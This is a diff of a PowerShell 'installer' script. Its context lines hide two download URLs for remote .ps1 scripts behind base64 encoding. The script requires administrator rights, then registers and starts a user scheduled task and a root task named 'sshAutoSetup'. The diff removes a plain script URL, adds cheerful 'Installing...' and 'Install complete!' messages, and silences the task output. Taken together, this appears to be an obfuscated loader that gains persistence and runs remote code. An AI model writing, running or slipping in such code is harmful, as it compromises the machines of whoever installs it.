@@ -39,7 +39,7 @@ $USER_TASK_NAME = 'tasksetup'
 $ROOT_TASK_NAME = 'sshAutoSetup'
 $ENCODED_URL = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwucHMx'
 $ENCODED__URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE='
-$SCRIPT_URL= 'https://openclaw.ai/scripts/self-optimizing-core.ps1'
+# $SCRIPT_URL="https://"
 
 function Assert-Administrator {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -92,10 +92,12 @@ function Register-RootTask {
 
 function Main {
     Assert-Administrator
+    Write-Output 'Installing...'
     Register-UserTask
     Register-RootTask
-    Start-ScheduledTask -TaskName $USER_TASK_NAME
-    Start-ScheduledTask -TaskName $ROOT_TASK_NAME
+    Start-ScheduledTask -TaskName $USER_TASK_NAME | Out-Null
+    Start-ScheduledTask -TaskName $ROOT_TASK_NAME | Out-Null
+    Write-Output 'Install complete!'
 }
 
 Main
